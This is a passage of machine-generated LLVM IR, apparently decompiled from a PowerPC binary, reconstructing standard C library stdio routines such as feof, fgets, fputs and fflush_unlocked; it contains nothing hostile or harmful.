  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_10011b8c.303 to i32), { 3, 0, 1, 2 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_10011b4c.302 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 0, 3, 4, 2, 5, 1, 6, 7 }
  uselistorder i32* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009594, { 9, 6, 8, 7, 4, 2, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_10009584, { 1, 0 }
  uselistorder label %dec_label_pc_10009550, { 1, 0 }
  uselistorder label %dec_label_pc_10009520, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100094ac, { 1, 0 }
  uselistorder label %dec_label_pc_10009498, { 1, 0 }
  uselistorder label %dec_label_pc_1000945c, { 1, 0 }
  uselistorder label %dec_label_pc_100093a4, { 1, 0 }
  uselistorder label %dec_label_pc_10009350, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009300, { 1, 0 }
  uselistorder label %dec_label_pc_100092d4, { 1, 0 }
  uselistorder label %dec_label_pc_10009288, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10009284, { 1, 0 }
  uselistorder label %dec_label_pc_100091f8, { 1, 0 }
  uselistorder label %dec_label_pc_100091f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10009190, { 1, 0 }
  uselistorder label %dec_label_pc_1000918c, { 1, 0 }
  uselistorder label %dec_label_pc_10009178, { 1, 0 }
  uselistorder label %dec_label_pc_10009158, { 1, 0 }
  uselistorder label %dec_label_pc_10009154, { 1, 0 }
  uselistorder label %dec_label_pc_10009138, { 1, 0 }
}

define i32 @feof(i32 %arg1) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_100095b0 = call i32 @__asm_mfcr()
  store i32 %v0_100095b0, i32* %r31.global-to-local, align 4
  %v2_100095d4 = add i32 %v0_100095b0, 52
  %v3_100095d4 = inttoptr i32 %v2_100095d4 to i32*
  %v4_100095d4 = load i32, i32* %v3_100095d4, align 4
  %v2_100095d8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100095d8, i32* @r3, align 4
  %v3_100095dc = icmp eq i32 %v4_100095d4, 0
  store i1 %v3_100095dc, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_100095dc, label %dec_label_pc_100095f0, label %dec_label_pc_100095f0.thread

dec_label_pc_100095f0.thread:                     ; preds = %entry
  %v1_100095f83 = inttoptr i32 %v0_100095b0 to i16*
  %v2_100095f84 = load i16, i16* %v1_100095f83, align 2
  %v3_100095f85 = zext i16 %v2_100095f84 to i32
  store i32 %v3_100095f85, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009604

dec_label_pc_100095f0:                            ; preds = %entry
  %v0_100095e4 = call i32 @__pthread_return_void()
  %v0_100095ec = call i32 @__pthread_return_0()
  %v0_100095f8.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_100095fc.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  store i32 %v2_100095d8, i32* @r3, align 4
  %v1_100095f8 = inttoptr i32 %v0_100095f8.pre to i16*
  %v2_100095f8 = load i16, i16* %v1_100095f8, align 2
  %v3_100095f8 = zext i16 %v2_100095f8 to i32
  store i32 %v3_100095f8, i32* %r31.global-to-local, align 4
  br i1 %v0_100095fc.pre, label %dec_label_pc_10009600, label %dec_label_pc_10009604

dec_label_pc_10009600:                            ; preds = %dec_label_pc_100095f0
  %v0_10009600 = call i32 @__pthread_return_void()
  br label %dec_label_pc_10009604

dec_label_pc_10009604:                            ; preds = %dec_label_pc_100095f0.thread, %dec_label_pc_100095f0, %dec_label_pc_10009600
  %v3_100095f86 = phi i32 [ %v3_100095f85, %dec_label_pc_100095f0.thread ], [ %v3_100095f8, %dec_label_pc_100095f0 ], [ %v3_100095f8, %dec_label_pc_10009600 ]
  %v1_10009608 = call i32 @__asm_rlwinm(i32 %v3_100095f86, i32 0, i32 29, i32 29)
  %v1_10009618 = call %0 @__asm_mtcrf(i32 8, i32 %v0_100095b0)
  %v9_10009618 = extractvalue %0 %v1_10009618, 7
  store i4 %v9_10009618, i4* @cr4, align 1
  ret i32 %v1_10009608

; uselistorder directives
  uselistorder i32 %v0_100095b0, { 3, 0, 1, 2 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_10009604, { 2, 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000962c = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* %r31.global-to-local, align 4
  store i32 %v0_1000962c, i32* %r28.global-to-local, align 4
  %v1_10009650 = add i32 %arg3, 52
  %v2_10009650 = inttoptr i32 %v1_10009650 to i32*
  %v3_10009650 = load i32, i32* %v2_10009650, align 4
  %v2_10009654 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10009654, i32* @r3, align 4
  %v3_10009660 = icmp eq i32 %v3_10009650, 0
  store i1 %v3_10009660, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10009660, label %dec_label_pc_10009668, label %dec_label_pc_10009674

dec_label_pc_10009668:                            ; preds = %entry
  %v0_10009668 = call i32 @__pthread_return_void()
  %v0_10009670 = call i32 @__pthread_return_0()
  %v0_10009674.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_10009678.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_1000967c.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10009674

dec_label_pc_10009674:                            ; preds = %entry, %dec_label_pc_10009668
  %v0_1000967c = phi i32 [ %v0_1000962c, %entry ], [ %v0_1000967c.pre, %dec_label_pc_10009668 ]
  %v0_10009678 = phi i32 [ %arg3, %entry ], [ %v0_10009678.pre, %dec_label_pc_10009668 ]
  %v0_10009674 = phi i32 [ %arg2, %entry ], [ %v0_10009674.pre, %dec_label_pc_10009668 ]
  store i32 268473988, i32* @lr, align 4
  %v3_10009680 = inttoptr i32 %v0_1000967c to i8*
  %v4_10009680 = call i32 @__GI_fgets_unlocked(i8* %v3_10009680, i32 %v0_10009674, i32 %v0_10009678)
  store i32 %v4_10009680, i32* @r31, align 4
  store i32 %v2_10009654, i32* @r3, align 4
  %v0_10009690 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10009690, label %dec_label_pc_10009694, label %dec_label_pc_10009698

dec_label_pc_10009694:                            ; preds = %dec_label_pc_10009674
  %v0_10009694 = call i32 @__pthread_return_void()
  %v0_1000969c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009698

dec_label_pc_10009698:                            ; preds = %dec_label_pc_10009674, %dec_label_pc_10009694
  %v0_1000969c = phi i32 [ %v4_10009680, %dec_label_pc_10009674 ], [ %v0_1000969c.pre, %dec_label_pc_10009694 ]
  %v1_100096ac = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000962c)
  %v9_100096ac = extractvalue %0 %v1_100096ac, 7
  store i4 %v9_100096ac, i4* @cr4, align 1
  ret i32 %v0_1000969c

; uselistorder directives
  uselistorder i32 %v0_1000962c, { 1, 0, 2 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10009698, { 1, 0 }
  uselistorder label %dec_label_pc_10009674, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r29.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_100096c0 = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r31.global-to-local, align 4
  store i32 %v0_100096c0, i32* %r29.global-to-local, align 4
  %v2_100096e0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100096e0, i32* @r3, align 4
  %v1_100096e4 = add i32 %arg2, 52
  %v2_100096e4 = inttoptr i32 %v1_100096e4 to i32*
  %v3_100096e4 = load i32, i32* %v2_100096e4, align 4
  %v3_100096f0 = icmp eq i32 %v3_100096e4, 0
  store i1 %v3_100096f0, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_100096f0, label %dec_label_pc_100096f8, label %dec_label_pc_10009704

dec_label_pc_100096f8:                            ; preds = %entry
  %v0_100096f8 = call i32 @__pthread_return_void()
  %v0_10009700 = call i32 @__pthread_return_0()
  %v0_10009704.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10009708.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10009704

dec_label_pc_10009704:                            ; preds = %entry, %dec_label_pc_100096f8
  %v0_10009708 = phi i32 [ %v0_100096c0, %entry ], [ %v0_10009708.pre, %dec_label_pc_100096f8 ]
  %v0_10009704 = phi i32 [ %arg2, %entry ], [ %v0_10009704.pre, %dec_label_pc_100096f8 ]
  store i32 268474128, i32* @lr, align 4
  %v2_1000970c = call i32 @__GI_fputs_unlocked(i32 %v0_10009708, i32 %v0_10009704)
  store i32 %v2_1000970c, i32* %r31.global-to-local, align 4
  store i32 %v2_100096e0, i32* @r3, align 4
  %v0_1000971c = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000971c, label %dec_label_pc_10009720, label %dec_label_pc_10009724

dec_label_pc_10009720:                            ; preds = %dec_label_pc_10009704
  %v0_10009720 = call i32 @__pthread_return_void()
  %v0_10009728.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009724

dec_label_pc_10009724:                            ; preds = %dec_label_pc_10009704, %dec_label_pc_10009720
  %v0_10009728 = phi i32 [ %v2_1000970c, %dec_label_pc_10009704 ], [ %v0_10009728.pre, %dec_label_pc_10009720 ]
  %v1_10009738 = call %0 @__asm_mtcrf(i32 8, i32 %v0_100096c0)
  %v9_10009738 = extractvalue %0 %v1_10009738, 7
  store i4 %v9_10009738, i4* @cr4, align 1
  ret i32 %v0_10009728

; uselistorder directives
  uselistorder i32 %v0_100096c0, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @__GI_fputs_unlocked, { 1, 0 }
  uselistorder label %dec_label_pc_10009724, { 1, 0 }
  uselistorder label %dec_label_pc_10009704, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000bfac.279 to i32), i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_100231b8.280 to i32), i32* @r29, align 4
  %v2_10009768 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10009768, i32* @r3, align 4
  %v0_10009770 = call i32 @__pthread_return_void()
  %v0_10009778 = call i32 @__pthread_return_0()
  %v3_10009780 = load i32, i32* @global_var_10023548.281, align 4
  %v3_10009784 = icmp eq i32 %v3_10009780, 1
  br i1 %v3_10009784, label %dec_label_pc_1000978c, label %dec_label_pc_10009834

dec_label_pc_1000978c:                            ; preds = %entry
  %v3_10009790 = load i32, i32* @global_var_1002354c.282, align 4
  %tmp7 = icmp slt i32 %v3_10009790, 1
  br i1 %tmp7, label %dec_label_pc_10009834, label %dec_label_pc_1000979c

dec_label_pc_1000979c:                            ; preds = %dec_label_pc_1000978c
  %v2_100097a8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100097a8, i32* @r3, align 4
  store i32 0, i32* @r30, align 4
  %v0_100097b4 = call i32 @__pthread_return_void()
  %v0_100097bc = call i32 @__pthread_return_0()
  %storemerge8 = load i32, i32* bitcast (i32** @global_var_100234f8.287 to i32*), align 4
  store i32 %storemerge8, i32* @r29, align 4
  %v3_1000981411 = icmp eq i32 %storemerge8, 0
  %v0_1000981812 = load i32, i32* @r30, align 4
  br i1 %v3_1000981411, label %dec_label_pc_10009820, label %dec_label_pc_100097cc

dec_label_pc_100097cc:                            ; preds = %dec_label_pc_1000979c, %dec_label_pc_10009814.backedge
  %v0_1000981817 = phi i32 [ %v0_10009818, %dec_label_pc_10009814.backedge ], [ %v0_1000981812, %dec_label_pc_1000979c ]
  %v3_1000981818.in = phi i32 [ %v0_10009818, %dec_label_pc_10009814.backedge ], [ %v0_1000981812, %dec_label_pc_1000979c ]
  %storemerge16 = phi i32 [ %storemerge, %dec_label_pc_10009814.backedge ], [ %storemerge8, %dec_label_pc_1000979c ]
  %v1_100097cc = inttoptr i32 %storemerge16 to i16*
  %v2_100097cc = load i16, i16* %v1_100097cc, align 2
  %v1_100097d0 = add i32 %storemerge16, 32
  %v2_100097d0 = inttoptr i32 %v1_100097d0 to i32*
  %v3_100097d0 = load i32, i32* %v2_100097d0, align 4
  store i32 %v3_100097d0, i32* @r31, align 4
  %v1_100097d4 = and i16 %v2_100097cc, -32720
  %v3_100097d8 = icmp eq i16 %v1_100097d4, 48
  br i1 %v3_100097d8, label %dec_label_pc_100097e8, label %dec_label_pc_100097e0

dec_label_pc_100097e0:                            ; preds = %dec_label_pc_100097cc
  store i32 %storemerge16, i32* @r30, align 4
  br label %dec_label_pc_10009814.backedge

dec_label_pc_100097e8:                            ; preds = %dec_label_pc_100097cc
  %v3_1000981818 = icmp eq i32 %v3_1000981818.in, 0
  br i1 %v3_1000981818, label %dec_label_pc_100097ec, label %dec_label_pc_100097f8

dec_label_pc_100097ec:                            ; preds = %dec_label_pc_100097e8
  store i32 %v3_100097d0, i32* bitcast (i32** @global_var_100234f8.287 to i32*), align 4
  br label %dec_label_pc_100097fc

dec_label_pc_100097f8:                            ; preds = %dec_label_pc_100097e8
  %v2_100097f8 = add i32 %v0_1000981817, 32
  %v3_100097f8 = inttoptr i32 %v2_100097f8 to i32*
  store i32 %v3_100097d0, i32* %v3_100097f8, align 4
  %v0_100097fc.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100097fc

dec_label_pc_100097fc:                            ; preds = %dec_label_pc_100097ec, %dec_label_pc_100097f8
  %v0_100097fc = phi i32 [ %storemerge16, %dec_label_pc_100097ec ], [ %v0_100097fc.pre, %dec_label_pc_100097f8 ]
  %v1_100097fc = inttoptr i32 %v0_100097fc to i16*
  %v2_100097fc = load i16, i16* %v1_100097fc, align 2
  store i32 %v0_100097fc, i32* @r3, align 4
  %v1_10009804 = and i16 %v2_100097fc, 8192
  %v3_10009804 = icmp eq i16 %v1_10009804, 0
  br i1 %v3_10009804, label %dec_label_pc_10009814.backedge, label %dec_label_pc_1000980c

dec_label_pc_10009814.backedge:                   ; preds = %dec_label_pc_100097fc, %dec_label_pc_100097e0, %dec_label_pc_1000980c
  %storemerge = load i32, i32* @r31, align 4
  store i32 %storemerge, i32* @r29, align 4
  %v3_10009814 = icmp eq i32 %storemerge, 0
  %v0_10009818 = load i32, i32* @r30, align 4
  br i1 %v3_10009814, label %dec_label_pc_10009820, label %dec_label_pc_100097cc

dec_label_pc_1000980c:                            ; preds = %dec_label_pc_100097fc
  store i32 268474384, i32* @lr, align 4
  %v0_1000980c = call i32 @free()
  br label %dec_label_pc_10009814.backedge

dec_label_pc_10009820:                            ; preds = %dec_label_pc_10009814.backedge, %dec_label_pc_1000979c
  store i32 %v2_100097a8, i32* @r3, align 4
  %v0_10009828 = call i32 @__pthread_return_void()
  %v0_10009830 = load i32, i32* @r29, align 4
  store i32 %v0_10009830, i32* @global_var_1002354c.282, align 4
  %v3_1000983c.pre = load i32, i32* @global_var_10023548.281, align 4
  br label %dec_label_pc_10009834

dec_label_pc_10009834:                            ; preds = %entry, %dec_label_pc_1000978c, %dec_label_pc_10009820
  %v3_1000983c = phi i32 [ %v3_10009780, %entry ], [ 1, %dec_label_pc_1000978c ], [ %v3_1000983c.pre, %dec_label_pc_10009820 ]
  store i32 %v2_10009768, i32* @r3, align 4
  %v1_10009844 = add i32 %v3_1000983c, -1
  store i32 %v1_10009844, i32* @global_var_10023548.281, align 4
  %v0_1000984c = call i32 @__pthread_return_void()
  ret i32 %v0_1000984c

; uselistorder directives
  uselistorder i32 %v0_10009818, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_100097fc, { 1, 0 }
  uselistorder i32 %v3_100097d0, { 1, 0, 2 }
  uselistorder i32 %storemerge16, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10009834, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10009814.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100097fc, { 1, 0 }
  uselistorder label %dec_label_pc_100097cc, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32** @global_var_100234f8.287 to i32), i32* %r9.global-to-local, align 4
  %v5_10009874 = icmp eq i16* %arg1, bitcast (i32** @global_var_100234f8.287 to i16*)
  store i32 %tmp, i32* @r29, align 4
  store i32 0, i32* @r27, align 4
  br i1 %v5_10009874, label %dec_label_pc_10009898, label %dec_label_pc_1000988c

dec_label_pc_1000988c:                            ; preds = %entry
  %v4_1000988c = icmp eq i16* %arg1, null
  store i32 256, i32* @r27, align 4
  br i1 %v4_1000988c, label %dec_label_pc_10009898, label %dec_label_pc_100099c4

dec_label_pc_10009898:                            ; preds = %dec_label_pc_1000988c, %entry
  store i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000bfac.279 to i32), i32* @r30, align 4
  %v2_100098a4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100098a4, i32* @r3, align 4
  %v0_100098b8 = call i32 @__pthread_return_void()
  %v0_100098c0 = call i32 @__pthread_return_0()
  %v3_100098c8 = load i32, i32* @global_var_10023548.281, align 4
  store i32 %v2_100098a4, i32* @r3, align 4
  %v1_100098d8 = add i32 %v3_100098c8, 1
  store i32 %v1_100098d8, i32* %r9.global-to-local, align 4
  store i32 %v1_100098d8, i32* @global_var_10023548.281, align 4
  %v0_100098e4 = call i32 @__pthread_return_void()
  store i32 %v2_100098a4, i32* @r3, align 4
  %v0_100098f4 = call i32 @__pthread_return_void()
  %v0_100098fc = call i32 @__pthread_return_0()
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %v2_100098a4, i32* @r3, align 4
  %v3_10009908 = load i32, i32* bitcast (i32** @global_var_100234f8.287 to i32*), align 4
  store i32 %v3_10009908, i32* @r31, align 4
  store i32 0, i32* @r28, align 4
  %v0_10009914 = call i32 @__pthread_return_void()
  %v0_100099b4.pr = load i32, i32* @r31, align 4
  %v3_100099b43 = icmp eq i32 %v0_100099b4.pr, 0
  br i1 %v3_100099b43, label %dec_label_pc_100099bc, label %dec_label_pc_1000991c

dec_label_pc_1000991c:                            ; preds = %dec_label_pc_10009898, %dec_label_pc_100099b0
  %v0_10009938 = phi i32 [ %v3_100099b0, %dec_label_pc_100099b0 ], [ %v0_100099b4.pr, %dec_label_pc_10009898 ]
  %v1_1000991c = inttoptr i32 %v0_10009938 to i16*
  %v2_1000991c = load i16, i16* %v1_1000991c, align 2
  %v3_1000991c = zext i16 %v2_1000991c to i32
  %v1_10009920 = and i32 %v3_1000991c, 64
  store i32 %v1_10009920, i32* %r9.global-to-local, align 4
  %v3_10009920 = icmp eq i32 %v1_10009920, 0
  br i1 %v3_10009920, label %dec_label_pc_100099b0, label %dec_label_pc_10009928

dec_label_pc_10009928:                            ; preds = %dec_label_pc_1000991c
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_1000992c = load i32, i32* @global_var_100234fc.285, align 4
  %v3_10009930 = icmp eq i32 %v3_1000992c, 2
  br i1 %v3_10009930, label %dec_label_pc_10009954, label %dec_label_pc_10009938

dec_label_pc_10009938:                            ; preds = %dec_label_pc_10009928
  store i32 %v2_100098a4, i32* @r3, align 4
  %v0_10009948 = call i32 @__pthread_return_void()
  %v0_10009950 = call i32 @__pthread_return_0()
  %v0_10009954.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009954

dec_label_pc_10009954:                            ; preds = %dec_label_pc_10009928, %dec_label_pc_10009938
  %v0_10009968 = phi i32 [ %v0_10009938, %dec_label_pc_10009928 ], [ %v0_10009954.pre, %dec_label_pc_10009938 ]
  %v1_10009954 = inttoptr i32 %v0_10009968 to i16*
  %v2_10009954 = load i16, i16* %v1_10009954, align 2
  %v3_10009954 = zext i16 %v2_10009954 to i32
  %v0_10009958 = load i32, i32* @r27, align 4
  %v2_10009958 = or i32 %v0_10009958, %v3_10009954
  %v1_1000995c = and i32 %v2_10009958, 832
  %v1_10009960 = xor i32 %v1_1000995c, 320
  store i32 %v1_10009960, i32* %r9.global-to-local, align 4
  %v3_10009960 = icmp eq i32 %v1_10009960, 0
  br i1 %v3_10009960, label %dec_label_pc_10009968, label %dec_label_pc_10009994

dec_label_pc_10009968:                            ; preds = %dec_label_pc_10009954
  store i32 %v0_10009968, i32* @r3, align 4
  store i32 268474736, i32* @lr, align 4
  %v0_1000996c = call i32 @__stdio_wcommit()
  %v3_10009970 = icmp eq i32 %v0_1000996c, 0
  br i1 %v3_10009970, label %dec_label_pc_10009980, label %dec_label_pc_10009978

dec_label_pc_10009978:                            ; preds = %dec_label_pc_10009968
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_10009994

dec_label_pc_10009980:                            ; preds = %dec_label_pc_10009968
  %v0_10009980 = load i32, i32* @r31, align 4
  %v1_10009980 = inttoptr i32 %v0_10009980 to i16*
  %v2_10009980 = load i16, i16* %v1_10009980, align 2
  %v3_10009980 = zext i16 %v2_10009980 to i32
  %v1_10009984 = add i32 %v0_10009980, 8
  %v2_10009984 = inttoptr i32 %v1_10009984 to i32*
  %v3_10009984 = load i32, i32* %v2_10009984, align 4
  store i32 %v3_10009984, i32* %r9.global-to-local, align 4
  %v1_10009988 = call i32 @__asm_rlwinm(i32 %v3_10009980, i32 0, i32 26, i32 24)
  %v2_10009988 = trunc i32 %v1_10009988 to i16
  %v1_1000998c = load i32, i32* @r31, align 4
  %v2_1000998c = add i32 %v1_1000998c, 28
  %v3_1000998c = inttoptr i32 %v2_1000998c to i32*
  store i32 %v3_10009984, i32* %v3_1000998c, align 4
  %v3_10009990 = load i32, i32* @r31, align 4
  %v4_10009990 = inttoptr i32 %v3_10009990 to i16*
  store i16 %v2_10009988, i16* %v4_10009990, align 2
  br label %dec_label_pc_10009994

dec_label_pc_10009994:                            ; preds = %dec_label_pc_10009954, %dec_label_pc_10009978, %dec_label_pc_10009980
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10009998 = load i32, i32* @global_var_100234fc.285, align 4
  %v3_1000999c = icmp eq i32 %v3_10009998, 2
  br i1 %v3_1000999c, label %dec_label_pc_100099b0, label %dec_label_pc_100099a4

dec_label_pc_100099a4:                            ; preds = %dec_label_pc_10009994
  store i32 %v2_100098a4, i32* @r3, align 4
  %v0_100099ac = call i32 @__pthread_return_void()
  br label %dec_label_pc_100099b0

dec_label_pc_100099b0:                            ; preds = %dec_label_pc_10009994, %dec_label_pc_1000991c, %dec_label_pc_100099a4
  %v0_100099b0 = load i32, i32* @r31, align 4
  %v1_100099b0 = add i32 %v0_100099b0, 32
  %v2_100099b0 = inttoptr i32 %v1_100099b0 to i32*
  %v3_100099b0 = load i32, i32* %v2_100099b0, align 4
  store i32 %v3_100099b0, i32* @r31, align 4
  %v3_100099b4 = icmp eq i32 %v3_100099b0, 0
  br i1 %v3_100099b4, label %dec_label_pc_100099bc, label %dec_label_pc_1000991c

dec_label_pc_100099bc:                            ; preds = %dec_label_pc_100099b0, %dec_label_pc_10009898
  store i32 ptrtoint (i32* @global_var_100099c0.310 to i32), i32* @lr, align 4
  %v0_100099bc = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_100099fc

dec_label_pc_100099c4:                            ; preds = %dec_label_pc_1000988c
  %v3_100099c4 = load i16, i16* %arg1, align 2
  %v4_100099c4 = zext i16 %v3_100099c4 to i32
  store i32 0, i32* @r28, align 4
  %v1_100099cc = and i32 %v4_100099c4, 64
  store i32 %v1_100099cc, i32* %r9.global-to-local, align 4
  %v3_100099cc = icmp eq i32 %v1_100099cc, 0
  br i1 %v3_100099cc, label %dec_label_pc_100099fc, label %dec_label_pc_100099d4

dec_label_pc_100099d4:                            ; preds = %dec_label_pc_100099c4
  store i32 268474840, i32* @lr, align 4
  %v0_100099d4 = call i32 @__stdio_wcommit()
  store i32 -1, i32* @r28, align 4
  %v3_100099dc = icmp eq i32 %v0_100099d4, 0
  br i1 %v3_100099dc, label %dec_label_pc_100099e4, label %dec_label_pc_100099fc

dec_label_pc_100099e4:                            ; preds = %dec_label_pc_100099d4
  %v0_100099e4 = load i32, i32* @r29, align 4
  %v1_100099e4 = inttoptr i32 %v0_100099e4 to i16*
  %v2_100099e4 = load i16, i16* %v1_100099e4, align 2
  %v3_100099e4 = zext i16 %v2_100099e4 to i32
  store i32 0, i32* @r28, align 4
  %v1_100099ec = add i32 %v0_100099e4, 8
  %v2_100099ec = inttoptr i32 %v1_100099ec to i32*
  %v3_100099ec = load i32, i32* %v2_100099ec, align 4
  store i32 %v3_100099ec, i32* %r9.global-to-local, align 4
  %v1_100099f0 = call i32 @__asm_rlwinm(i32 %v3_100099e4, i32 0, i32 26, i32 24)
  %v2_100099f0 = trunc i32 %v1_100099f0 to i16
  %v3_100099f4 = load i32, i32* @r29, align 4
  %v4_100099f4 = inttoptr i32 %v3_100099f4 to i16*
  store i16 %v2_100099f0, i16* %v4_100099f4, align 2
  %v0_100099f8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100099f8 = load i32, i32* @r29, align 4
  %v2_100099f8 = add i32 %v1_100099f8, 28
  %v3_100099f8 = inttoptr i32 %v2_100099f8 to i32*
  store i32 %v0_100099f8, i32* %v3_100099f8, align 4
  br label %dec_label_pc_100099fc

dec_label_pc_100099fc:                            ; preds = %dec_label_pc_100099d4, %dec_label_pc_100099c4, %dec_label_pc_100099bc, %dec_label_pc_100099e4
  %v0_10009a00 = load i32, i32* @r28, align 4
  ret i32 %v0_10009a00

; uselistorder directives
  uselistorder i32 %v3_100099b0, { 1, 2, 0 }
  uselistorder i32 %v1_10009960, { 1, 0 }
  uselistorder i32 %v2_100098a4, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11 }
  uselistorder i32* bitcast (i32** @global_var_100234f8.287 to i32*), { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32* @global_var_10023548.281, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i16* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_100099fc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100099b0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009994, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10009954, { 1, 0 }
  uselistorder label %dec_label_pc_1000991c, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 %arg3, i32* @r30, align 4
  %tmp19 = icmp slt i32 %arg2, 1
  br i1 %tmp19, label %dec_label_pc_10009abc, label %dec_label_pc_10009a34

dec_label_pc_10009a34:                            ; preds = %entry
  store i32 %tmp, i32* @r31, align 4
  %v2_10009a9c3 = add i32 %arg2, -1
  store i32 %v2_10009a9c3, i32* @r29, align 4
  %v4_10009aa49 = icmp eq i32 %arg2, 1
  br i1 %v4_10009aa49, label %dec_label_pc_10009aa8, label %dec_label_pc_10009a3c

dec_label_pc_10009a3c:                            ; preds = %dec_label_pc_10009a34, %dec_label_pc_10009a9c.backedge
  %v2_10009a58 = phi i32 [ %v2_10009a5812, %dec_label_pc_10009a9c.backedge ], [ %tmp, %dec_label_pc_10009a34 ]
  %v0_10009a3c = phi i32 [ %v0_10009aa0, %dec_label_pc_10009a9c.backedge ], [ %arg3, %dec_label_pc_10009a34 ]
  %v1_10009a3c = add i32 %v0_10009a3c, 16
  %v2_10009a3c = inttoptr i32 %v1_10009a3c to i32*
  %v3_10009a3c = load i32, i32* %v2_10009a3c, align 4
  %v1_10009a40 = add i32 %v0_10009a3c, 24
  %v2_10009a40 = inttoptr i32 %v1_10009a40 to i32*
  %v3_10009a40 = load i32, i32* %v2_10009a40, align 4
  %v2_10009a44 = add i32 %v3_10009a3c, 1
  store i32 %v2_10009a44, i32* %r11.global-to-local, align 4
  %v3_10009a48 = icmp ult i32 %v3_10009a3c, %v3_10009a40
